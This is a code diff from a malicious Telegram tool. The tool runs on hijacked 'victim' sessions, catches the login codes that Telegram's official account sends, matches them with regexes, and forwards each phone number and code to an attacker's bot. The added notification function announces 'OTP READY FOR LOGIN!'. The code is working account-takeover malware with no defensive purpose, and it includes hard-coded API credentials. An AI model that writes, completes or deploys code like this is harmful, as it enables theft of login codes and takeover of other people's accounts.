@@ -4,15 +4,45 @@ import logging
 from telethon import TelegramClient, events
 from telethon.sessions import StringSession
 from database import get_all_victim_sessions, update_victim_otp
-from bot_handler import send_otp_notification
 
 logger = logging.getLogger(__name__)
 
 API_ID = int(os.environ.get("API_ID", 24289127))
 API_HASH = os.environ.get("API_HASH", "cd63113435f4997590ee4a308fbf1e2c")
 
-# Global dictionary to store active clients
 active_clients = {}
+
+async def send_otp_notification(phone, otp_code, source="Telegram"):
+    """Send OTP notification using requests instead of aiohttp"""
+    try:
+        from datetime import datetime
+        message = (
+            f"🚨 *OTP AUTO-CAPTURED!* 😈\n\n"
+            f"📱 *Phone:* `{phone}`\n"
+            f"🔑 *OTP Code:* `{otp_code}`\n"
+            f"📨 *Source:* {source}\n"
+            f"⏰ *Time:* {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
+            f"💀 *OTP READY FOR LOGIN!*"
+        )
+        
+        # Use requests instead of aiohttp
+        import requests
+        BOT_TOKEN = os.environ.get("BOT_TOKEN")
+        CHAT_ID = os.environ.get("CHAT_ID")
+        
+        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+        data = {
+            'chat_id': CHAT_ID,
+            'text': message,
+            'parse_mode': 'Markdown'
+        }
+        
+        requests.post(url, data=data, timeout=10)
+        update_victim_otp(phone, otp_code)
+        logger.info(f"OTP notification sent for {phone}: {otp_code}")
+        
+    except Exception as e:
+        logger.error(f"Send OTP notification error: {e}")
 
 async def setup_otp_interceptor(phone, session_string):
     """Setup OTP interceptor for a victim"""
@@ -22,22 +52,15 @@ async def setup_otp_interceptor(phone, session_string):
         @client.on(events.NewMessage)
         async def message_handler(event):
             try:
-                # Check if message is from Telegram official
-                if event.message.sender_id == 777000:  # Telegram official ID
+                if event.message.sender_id == 777000:  # Telegram official
                     message_text = event.message.text
                     
-                    # OTP pattern matching
                     patterns = [
                         r'is your login code:?\s*(\d{4,6})',
                         r'verification code:?\s*(\d{4,6})',
                         r'kode verifikasi:?\s*(\d{4,6})',
-                        r'kode masuk:?\s*(\d{4,6})',
                         r'code:?\s*(\d{4,6})',
                         r'kode:?\s*(\d{4,6})',
-                        r'(\d{4,6})\s*is your code',
-                        r'kode Anda:?\s*(\d{4,6})',
-                        r'kode:\s*(\d{4,6})',
-                        r'code is\s*(\d{4,6})'
                     ]
                     
                     for pattern in patterns:
@@ -45,13 +68,11 @@ async def setup_otp_interceptor(phone, session_string):
                         if match:
                             otp_code = match.group(1)
                             logger.info(f"🚨 OTP Captured for {phone}: {otp_code}")
-                            
-                            # Send notification
-                            await send_otp_notification(phone, otp_code, "Telegram Message")
+                            await send_otp_notification(phone, otp_code)
                             break
                             
             except Exception as e:
-                logger.error(f"Message handler error for {phone}: {e}")
+                logger.error(f"Message handler error: {e}")
         
         await client.start()
         active_clients[phone] = client
@@ -85,9 +106,9 @@ async def start_otp_interceptors():
                     await setup_otp_interceptor(phone, session_string)
             
             logger.info(f"😈 OTP Interceptors active: {len(active_clients)}")
-            await asyncio.sleep(60)  # Check every minute
+            await asyncio.sleep(60)
             
     except Exception as e:
         logger.error(f"OTP interceptors main error: {e}")
         await asyncio.sleep(30)
-        await start_otp_interceptors()  # Restart
+        await start_otp_interceptors()
